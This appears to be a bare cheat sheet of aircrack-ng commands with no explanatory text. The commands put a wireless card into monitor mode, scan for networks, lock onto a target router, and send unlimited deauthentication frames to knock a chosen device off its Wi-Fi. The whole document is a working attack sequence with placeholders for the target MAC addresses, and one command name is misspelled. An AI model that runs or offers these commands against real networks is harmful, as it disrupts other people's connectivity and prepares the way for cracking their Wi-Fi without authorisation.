iwconfig

airmon-ng start wlan0

airdump-ng wlan0mon

airodump-ng wlan0mon --bssid [routers BSSID here]--channel [routers channel here]

aireplay-ng --deauth 0 -c [DEVICES MAC ADDRESS] -a [ROUTERS MAC ADDRESS] wlan0mon
